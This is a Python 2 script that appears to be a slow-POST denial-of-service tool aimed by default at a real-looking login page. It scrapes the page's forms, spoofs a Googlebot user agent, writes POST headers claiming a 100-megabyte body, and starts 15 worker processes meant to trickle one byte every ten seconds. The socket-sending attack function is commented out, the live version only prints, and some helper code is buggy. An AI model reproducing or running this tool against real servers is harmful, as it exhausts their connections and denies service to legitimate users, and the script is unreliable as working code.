#!/usr/bin/env python

import requests
import sys
import re
import random
import time

from bs4 import BeautifulSoup
from urlparse import urlparse
from multiprocessing import Process


DEFAULT_USER_AGENT   = '%s' %\
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'

MAX_WORKERS = 15
SLEEP_TIME  = 10

def form_to_dict(form):
    
    form_dict = {
        'action' : form.get('action', ''),
        'method' : form.get('method', 'post'),
        'id' : form.get('id', ''),
        'class' : form.get('class', ''),
        'inputs' : [],
    }
    
    for index, input_field in enumerate(form.findAll('input')):

        form_dict['inputs'].append({
            'id' : input_field.get('id', ''),
            'class' : input_field.get('class', ''),
            'name' : input_field.get('name', ''),
            'value' : input_field.get('value', ''),
            'type' : input_field.get('type', ''),
        })
    return form_dict

def get_forms(url):

    response = requests.get(url)
    
    soup = BeautifulSoup(response.text)

    forms = []
    for form in soup.findAll('form'):
        
        forms.append(form_to_dict(form))

    return forms

def print_forms(forms):

    for index,form in enumerate(forms):
        print 'Form #%d --> id: %s --> class: %s --> action: %s' %\
                (index, form['id'], form['class'], form['action'])



def choose_form(url):
    forms = get_forms(url)

    return make_choice(print_forms,
                'Please select a form from the list above.',
                forms,
                'form')

def choose_input(form):

    return make_choice(print_inputs,
                    'Please select a form field from the list above.',
                    form['inputs'],
                    'input')

def print_inputs(inputs):

    for index, input_field in enumerate(inputs):
        print 'Input #%d: %s' %\
            (index, input_field['name'])

def make_choice(menu_function, prompt, choices, field):

    while True:
        try:
            menu_function(choices)
            index = int(raw_input('Enter %s number: ' % field))
            return choices[index]
        except IndexError:
            print 'That is not a valid choice.'
        except ValueError:
            print 'That is not a valid choice.'
        print

def craft_headers(path, host, user_agent_list, param, cookies):

    user_agent = random.choice(user_agent_list)

    return '\n'.join([

        'POST %s HTTP/1.1' % path,
        'Host: %s' % host,
        'Connection: keep-alive',
        'Content-Length: 100000000',
        'User-Agent: %s' % user_agent,
        'cookies',
        '%s=' % param, 
    ])

def host_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    return m.group('host')

def port_from_url(url):

    p = '(?:http.*://)?(?P<host>[^:/ ]+).?(?P<port>[0-9]*).*'
    m = re.search(p,url)
    port = m.group('port')
    if port == '':
        return '80'
    return 

def get_cookies(target):

    response = requests.get(target)
    return response.headers.get('set-cookie', '')

def parse_args():

    return {
        'target' : 'http://hackru.org/login',
        'max_workers' : MAX_WORKERS,
        'user_agent_file' : '',
        'sleep_time' : SLEEP_TIME,
    }
    
def configure():

    args = parse_args()

    form = choose_form(args['target'])
    form_field = choose_input(form)

    cookies = get_cookies(args['target'])

    parsed_url = urlparse(args['target'])

    if form['action'] != '':
        if form['action'].startswith('/'):
            target = 'http://%s%s' % (parsed_url.netloc, form['action'])
    else:
        target = args['target']

    user_agents = [DEFAULT_USER_AGENT]
    if args['user_agent_file'] != '':
        with open(args['user_agent_file']) as fd:
            user_agents += fd.read().split('\n')

    return {

        'path' : parsed_url.path,
        'param' : form_field['name'],
        'host' : host_from_url(target),
        'port' : port_from_url(target),
        'target' : target,
        'cookies' : cookies,
        'user_agents' : user_agents,
        'max_workers' : args['max_workers'],
        'sleep_time' : args['sleep_time'],
    }

#def launch_attack(configs, headers):
#
#    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    sock.connect((configs['host'], configs['port']))
#    sock.send(headers)
#    while True:
#        sock.send("\x41")
#        time.sleep(configs['sleep_time'])
#    sock.close()

def launch_attack(i, configs, headers):

    while True:
        print "Worker #%d: sending \x41" % i
        time.sleep(configs['sleep_time'])
    print 'Worker #%d: closing connection' % i

if __name__ == '__main__':

    configs = configure()

    workers = []
    for i in xrange(configs['max_workers']):

        headers = craft_headers(configs['path'],
                            configs['host'],
                            random.choice(configs['user_agents']),
                            configs['param'],
                            configs['cookies'])

        p = Process(target=launch_attack, args=(i, configs, headers))
        p.start()
        workers.append(p)
    try:
        for w in workers:
            w.join()

    except KeyboardInterrupt:

        print '\nExiting on User Interrupt'
        for w in workers:
            w.terminate()
        for w in workers:
            w.join()
